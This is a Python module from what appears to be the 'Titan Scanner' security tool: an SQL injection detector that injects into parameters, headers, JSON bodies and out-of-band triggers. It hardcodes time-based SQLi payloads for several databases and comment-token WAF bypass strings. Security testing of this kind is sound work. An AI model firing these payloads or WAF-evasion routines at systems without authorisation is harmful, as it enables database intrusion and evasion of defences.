"""SQLi detection module for Titan Scanner — fully exhausted.

Five engines beyond basic query-param injection, composed from focused
mixin modules:
  1. HTTP Header & Cookie Injection  → surfaces.SurfacesMixin
  2. Nested JSON AST Walker          → surfaces.SurfacesMixin
  3. Out-of-Band DNS/HTTP (OAST)     → oob.OobMixin
  4. Dynamic Union Column Bisector   → union_bisect.UnionBisectMixin
  5. Polymorphic WAF Encodings       → payloads.PayloadMixin

The core single-parameter oracle stack lives in param_oracle.ParamOracleMixin.
Static data tables (error signatures, injectable headers, OOB templates)
live in signatures.py.
"""

from __future__ import annotations

from typing import Any

from titan.core.logger import get_logger
from titan.core.models import Finding
from titan.modules.sqli.oob import OobMixin
from titan.modules.sqli.param_oracle import ParamOracleMixin
from titan.modules.sqli.payloads import PayloadMixin
from titan.modules.sqli.signatures import (
    SQLI_ERROR_SIGNATURES as _SQLI_ERROR_SIGNATURES,
)
from titan.modules.sqli.surfaces import SurfacesMixin
from titan.modules.sqli.union_bisect import UnionBisectMixin
from titan.verify import BlindDetector

logger = get_logger("detector")


class SQLiDetector(
    SurfacesMixin,
    OobMixin,
    UnionBisectMixin,
    ParamOracleMixin,
    PayloadMixin,
):
    """Production-grade SQL injection detector with full exhaustion across all sink types."""

    ERROR_SIGNATURES = _SQLI_ERROR_SIGNATURES

    def __init__(self, payload_smith, fingerprint: dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint
        self.blind_detector = BlindDetector(samples=3, confidence=0.95)
        self._oob_client: Any | None = None

    # ------------------------------------------------------------------
    # PUBLIC ENTRY POINT — orchestrates the five engines
    # ------------------------------------------------------------------

    async def scan(
        self,
        context,
        target: str,
        method: str,
        url: str,
        params: dict[str, str],
    ) -> list[Finding]:
        findings: list[Finding] = []

        context_data = {
            "fingerprint": self.fingerprint,
            "attack_type": "sqli",
            "param_type": "text",
            "location": "query" if method == "GET" else "body",
        }

        # ── Payload assembly ──────────────────────────────────────────
        base_payloads = self.payload_smith.get_base_payloads("sqli", context_data)

        # Multi-dialect timing payloads
        base_payloads.extend(
            [
                "' AND SLEEP(3)--",
                "' OR SLEEP(3)--",
                "1' AND SLEEP(3)--",
                "' AND pg_sleep(3)--",
                "1' AND pg_sleep(3)--",
                "'; WAITFOR DELAY '0:0:3'--",
                "' AND BENCHMARK(5000000, MD5('x'))--",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
                "' AND RANDOMBLOB(500000000)--",
                "' AND 1=DBMS_LOCK.SLEEP(3)--",
                "SELECT PG_SLEEP(3)--",
                "' AND 1=CRYPTO_KEY(3)--",
            ]
        )

        # WAF detection + bypass payloads
        waf = self.payload_smith.detect_waf({}, "", 0) or self.fingerprint.get("waf", "unknown")
        if waf and waf != "unknown":
            base_payloads.extend(self.payload_smith.get_waf_bypass_payloads(base_payloads[:5], waf))

        # Comment-token WAF bypasses
        base_payloads.extend(
            [
                "' OR/**/1=1--",
                "'/**/OR/**/1=1--",
                "1'/**/AND/**/SLEEP(3)--",
                "1'/**/AND/**/pg_sleep(3)--",
                "'/**/AND/**/pg_sleep(3)--",
                "';/**/WAITFOR/**/DELAY/**/'0:0:3'--",
            ]
        )

        # Engine-5: Polymorphic WAF encodings
        base_payloads.extend(self._build_waf_polymorphic_set())

        mutated = await self.payload_smith.mutate(base_payloads, context_data)
        all_payloads = list(dict.fromkeys(base_payloads + mutated))

        # ── Engine 1: Query-param / body injection (all params, no cap) ──
        for param_name in list(params.keys()):
            param_val = params.get(param_name, "")
            param_payloads = self._build_param_payload_suite(param_name, param_val, all_payloads)
            f = await self._test_param(context, target, method, url, param_name, params, param_payloads)
            if f:
                findings.append(f)

        # ── Engine 2: HTTP Header injection ──────────────────────────────
        header_findings = await self._scan_headers(context, target, method, url, params, all_payloads)
        findings.extend(header_findings)

        # ── Engine 3: Nested JSON body injection ──────────────────────────
        json_findings = await self._scan_json_body(context, target, method, url, params, all_payloads)
        findings.extend(json_findings)

        # ── Engine 4: OOB / Interactsh DNS triggers ───────────────────────
        oob_findings = await self._scan_oob(context, target, method, url, params)
        findings.extend(oob_findings)

        # ── Engine 5: Dynamic Union column bisection (if param hit found) ─
        if findings:
            col_findings = await self._scan_union_bisect(context, target, method, url, params, findings[0])
            findings.extend(col_findings)

        return findings
